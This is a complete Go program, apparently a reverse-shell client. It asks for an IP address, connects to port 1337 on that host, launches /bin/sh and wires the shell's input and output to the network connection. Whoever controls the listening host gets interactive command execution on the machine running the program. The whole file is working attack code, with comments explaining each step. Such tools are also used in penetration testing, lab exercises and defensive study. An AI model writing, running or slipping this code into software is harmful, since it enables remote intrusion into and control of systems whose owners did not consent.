package main

//go client
import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

//Function returns the shell
func Shell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

func main() {
	var ip string

	//Parsing arguments and handle errors
	flag.Parse()
	fmt.Println("[+] Insert IP: ")
	fmt.Scanln(&ip)
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:1337", ip))
	//conn, err := net.Dial("tcp", "localhost:1337")
	if err != nil {
		log.Fatal("Cannot connect to the server")
	}

	//Calling shell
	shellCmd := Shell()

	//Creating pipes not mess up with buffering too much
	shellPipeReader, shellPipeWriter := io.Pipe()

	//Standard in is binded to connection
	shellCmd.Stdin = conn

	//Standard err and standard out are binded to writer pipe
	shellCmd.Stdout = shellPipeWriter
	shellCmd.Stderr = shellPipeWriter

	/*Sending the output from shellPipeReader to connection,
	using gorutine to not block code execution*/
	go io.Copy(conn, shellPipeReader)

	//run the command
	shellCmd.Run()

	//Close connection after shell is dead
	conn.Close()

}
